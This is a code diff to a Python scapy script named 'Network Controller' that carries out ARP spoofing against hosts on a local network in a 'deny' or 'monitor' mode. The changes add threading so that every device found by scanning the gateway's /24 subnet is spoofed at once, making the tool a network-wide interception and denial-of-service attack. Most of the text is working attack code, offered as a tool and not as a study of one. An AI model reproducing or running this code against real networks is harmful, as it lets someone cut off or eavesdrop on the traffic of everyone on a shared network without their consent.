@@ -1,11 +1,10 @@
 import logging
-
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 import time
 import scapy.all as scapy
 import argparse
 import sys
-
+import threading
 
 def get_arguments():
     parser = argparse.ArgumentParser()
@@ -61,18 +60,19 @@ def restore_arp_table(victim_ip, victim_mac, false_requester_ip, false_requester
         sys.exit(1)
 
 
-def scan_network(ip, timeout=2):
+def scan_network(ip, timeout=1):
     arp_req = scapy.ARP(pdst=ip)
-    # print(arp_req.summary())
-    # scapy.ls(scapy.ARP())
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_broadcast = broadcast / arp_req
-    # arp_broadcast.show()
-    answered = scapy.srp(arp_broadcast, timeout=timeout, verbose=False)[0]
+    answered = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
     return answered
 
 
 def start_attack(target_ip, gateway_ip):
+    if target_ip == gateway_ip:
+        print("[-] Skipping Gateway IP.")
+        return
+    print("[+] Attacking " + target_ip)
     target_mac = get_mac(target_ip)
     gateway_mac = get_mac(gateway_ip)
     count = 0
@@ -81,17 +81,28 @@ def start_attack(target_ip, gateway_ip):
             spoof_arp_table(target_ip, target_mac, gateway_ip)
             spoof_arp_table(gateway_ip, gateway_mac, target_ip)
             count += 1
-            print("\r[+]" + " Traffic of "+ option.target_ip + " has been "+(" Denied " if option.mode == 'd' else " Monitored ") +  " for " + str(count) + " seconds", end="")
+            if option.all:
+                print("\r[+] All Devices in "+ gateway_ip+ "/24 Network are being " + (" Denied " if option.mode == 'd' else " Monitored ") +  " for " + str(count) + " seconds", end="")
+            elif option.list_ip:
+                print("\r[+] All Devices in "+ option.list_ip+ " are being " + (" Denied " if option.mode == 'd' else " Monitored ") +  " for " + str(count) + " seconds", end="")
+            else:
+                print("\r[+]" + " Traffic of "+ target_ip + " has been "+(" Denied " if option.mode == 'd' else " Monitored ") +  " for " + str(count) + " seconds", end="")
             time.sleep(1)
 
     except KeyboardInterrupt:
         print("\n[+] Detected CTRL + C ...... Resetting ARP Tables ...... Please wait.")
+        if len(threads) > 0:
+            for index, thread in enumerate(threads):
+                logging.info("Main    : before joining thread %d.", index)
+                thread.join()
+                logging.info("Main    : thread %d done", index)
         restore_arp_table(target_ip, target_mac, gateway_ip, gateway_mac)
         restore_arp_table(gateway_ip, gateway_mac, target_ip, target_mac)
         print("[+] ARP Tables Reset Successfully")
 
 
 option = get_arguments()
+threads = list()
 print("\n[+][+]\t\tWelcome to Network Controller\t\t[+][+]\n")
 if option.mode == 'd':
     print("[+] Starting ARP Spoofing Attack in Deny Mode")
@@ -104,8 +115,9 @@ if option.all:
     res = scan_network(option.gateway_ip + "/24", option.timeout)
     print("[+] Found " + str(len(res)) + " devices")
     for i in res:
-        print("[+] Spoofing " + i[1].psrc)
-        # start_attack(i[1].psrc, option.gateway_ip)
+        x = threading.Thread(target=start_attack, args=(i[1].psrc, option.gateway_ip))
+        threads.append(x)
+        x.start()
 
 elif option.list_ip:
     print("[+] Spoofing devices " + str(option.list_ip))
